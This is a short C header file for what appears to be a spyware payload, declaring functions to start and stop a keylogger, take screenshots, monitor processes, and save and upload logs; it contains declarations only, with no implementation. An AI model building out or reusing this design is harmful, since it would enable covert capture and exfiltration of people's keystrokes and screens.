#ifndef PAYLOAD_H
#define PAYLOAD_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "payload_config.h"

// Payload initialization and cleanup
int payload_init(void);
void payload_cleanup(void);

// Core functionality
void start_keylogger(void);
void stop_keylogger(void);
void take_screenshot(void);
void monitor_processes(void);

// Data management
int save_logs(const char *data, size_t size);
int upload_logs(void);

// Utility functions
const char *get_payload_version(void);
const char *get_payload_name(void);

#endif // PAYLOAD_H